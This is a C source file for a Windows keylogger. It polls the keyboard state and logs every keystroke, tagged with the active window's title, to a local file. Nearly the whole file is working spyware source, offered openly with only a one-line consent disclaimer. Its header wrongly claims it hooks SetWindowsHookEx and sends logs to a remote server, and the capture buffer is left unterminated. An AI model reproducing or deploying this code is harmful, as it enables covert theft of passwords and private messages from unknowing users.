/**
 * Keylogger Created by Qwerty
 * Works only on Windows
 * 
 * This program captures every keystroke typed on the system by hooking into low-level keyboard events.
 * It records the pressed keys and can save them to a log file or transmit them to a remote server.
 * This works by using Windows API functions like SetWindowsHookEx to intercept keyboard input events.
 * 
 * Use responsibly and with consent. Unauthorized use is illegal.
 **/

#include <stdio.h>
#include <windows.h>

#define BUFFER_SIZE 1024 // size of the buffer array
#define PROCESS_SIZE 256 // size of the process buffer array
#define THREADS 2 // Number of threads
#define DELAY 70 // delay to not overwhelme the cpu

char* buffer = NULL;
int buffer_index = 0;
int size_b = BUFFER_SIZE;

//func to listen to the keystrokes
DWORD WINAPI listener(LPVOID lparam) {   
	int keyState[PROCESS_SIZE] = { 0 }; // Keep track of key press
	int special_keys[] = {0x7e, 0x60, 0x21, 0x40, 0x23, 0x24, 0x25, 0x5e,
 						0x26, 0x2a, 0x28, 0x29, 0x5f, 0x2d, 0x2b, 0x3d,
 		    			0x7b, 0x5b, 0x7d, 0x5d, 0x7c, 0x5c, 0x27, 0x22,
 						0x3b, 0x3a, 0x3c, 0x2c, 0x3e, 0x2e, 0x3f, 0x2f ,
						0x0D, 0x09, 0x20};
	int size = sizeof(special_keys)/sizeof(*special_keys);

    while (1) {
		// Checks if buffer needs to be reallocated
		if (buffer_index >= size_b - 1) {
			size_b *= 2;
			buffer = (char* )realloc(buffer, sizeof(char) * size_b);
			if (!buffer) {
				exit(1); // Exit gracefully
			}
		}

        // Check for Uppercase alphabetic keys (A-Z)
        for (int vKey = 0x41; vKey <= 0x5A ; vKey++) {
			// Key is pressed
            if ((GetAsyncKeyState(vKey) & 0x8000) && (keyState[vKey] == 0)) {
                buffer[buffer_index++] = (char) vKey;
				keyState[vKey] = 1;
            }
			// Key was pressed
			if ((GetAsyncKeyState(vKey) & 0x8000) == 0 && (keyState[vKey] == 1)) {
				keyState[vKey] = 0;
			}
        }

		// Check for Lowercase alphabetic keys (a-z)
        for (int vKey = 0x61; vKey <= 0x7A ; vKey++) {
			// Key is pressed
            if ((GetAsyncKeyState(vKey) & 0x8000) && (keyState[vKey] == 0)) {
                buffer[buffer_index++] = (char) vKey;
				keyState[vKey] = 1;
            }
			// Key was pressed
			if ((GetAsyncKeyState(vKey) & 0x8000) == 0 && (keyState[vKey] == 1)) {
				keyState[vKey] = 0;
			}
        }

        // Check for number keys (0-9)
        for (int vKey = 0x30; vKey <= 0x39; vKey++) {
			// Key is pressed
            if ((GetAsyncKeyState(vKey) & 0x8000) && (keyState[vKey] == 0)) {
                buffer[buffer_index++] = (char) vKey;
				keyState[vKey] = 1;
            }
			// Key was pressed
			if ((GetAsyncKeyState(vKey) & 0x8000) == 0 && (keyState[vKey] == 1)) {
				keyState[vKey] = 0;
			}
        }

        // Special keys 
        for (int vKey = 0; vKey < size; vKey++) {
			// key is pressed
			if ((GetAsyncKeyState(*(special_keys + vKey)) & 0x8000) && (keyState[*(special_keys + vKey)] == 0)) {
				buffer[buffer_index++] = (char) *(special_keys + vKey);
				keyState[*(special_keys + vKey)] = 1;
			}
			// Key was pressed
			if ((GetAsyncKeyState(*(special_keys + vKey)) & 0x8000) == 0 && (keyState[*(special_keys + vKey)] == 1)) {
				keyState[*(special_keys + vKey)] = 0;
			}
		}

		// Backspace ...
        if (GetAsyncKeyState(0x08) & 0x8000) {
            if (buffer_index > 0) {
                --buffer_index; // overwrites
            }
        }
        
        Sleep(DELAY); // slight delay not to overwhelm the cpu
    }
	return 0;
}

HWND get_window() {
	return GetForegroundWindow();
}

// func to write into a file
DWORD WINAPI writer(LPVOID lparam) {
	char forground_process[PROCESS_SIZE], background_process[PROCESS_SIZE] = {0};
	FILE* file = fopen("Keylogger.log", "a");
	if (!file) {
		exit(1); // file opening failed!
	}

	while (1) {
		HWND hwnd = get_window();
		if (!hwnd) {
			continue;
		}
		GetWindowText(hwnd, forground_process, PROCESS_SIZE);
		if (strcmp(background_process, forground_process)) {	
			// Write to the file
			fprintf(file, "[%s] : %s\n", forground_process, buffer);
			fflush(file);
			buffer_index = 0;
			*buffer = '\0'; // clear buffer
			strcpy(background_process, forground_process);
		}
		Sleep(1000); // Sleeps every 1 sec
	}

	fclose(file);
	return 0;
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
	buffer = (char*) malloc(BUFFER_SIZE * sizeof(char));
    HANDLE* threads = (HANDLE* ) malloc(THREADS * sizeof(HANDLE));
	
	if (!threads || !buffer) {
		return 1;
	}

	*threads = CreateThread(NULL, 0, &listener, NULL, 0, 0);
	*(threads + 1) = CreateThread(NULL, 0, &writer, NULL, 0, 0);

    WaitForMultipleObjects(THREADS, threads, TRUE, INFINITE); // Waiting for threads to complete
	
	//Cleaning
    free(threads);
	free(buffer);
    return 0;
}
